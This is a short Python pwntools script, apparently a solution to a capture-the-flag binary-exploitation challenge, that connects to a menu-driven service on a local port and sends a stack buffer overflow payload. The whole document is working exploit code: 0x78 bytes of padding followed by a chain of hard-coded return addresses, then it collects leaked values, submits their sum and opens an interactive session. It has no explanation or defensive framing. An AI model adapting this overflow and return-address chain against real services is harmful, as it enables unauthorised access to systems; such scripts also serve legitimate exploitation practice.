# /usr/bin/python
from pwn import *
​
context.log_level='debug'
​
r = remote('127.0.0.1', 9032)
r.recvuntil('Select Menu:')
r.sendline("1")
r.recvuntil('How many EXP did you earned? : ')
​
payload = 'A'*0x78
payload += p32(0x809fe4b)
payload += p32(0x809fe6a)
payload += p32(0x809fe89)
payload += p32(0x809fea8)
payload += p32(0x809fec7)
payload += p32(0x809fee6)
payload += p32(0x809ff05)
payload += p32(0x0809fffc)
​
r.sendline(payload)
​
exp = 0
​
for i in range(7):
       r.recvuntil('EXP +')
       exp += int(r.recvline()[:-2])
​
r.recvuntil('Select Menu:')
r.sendline("1")
r.recvuntil('How many EXP did you earned? : ')
r.sendline(str(exp))
​
r.interactive()
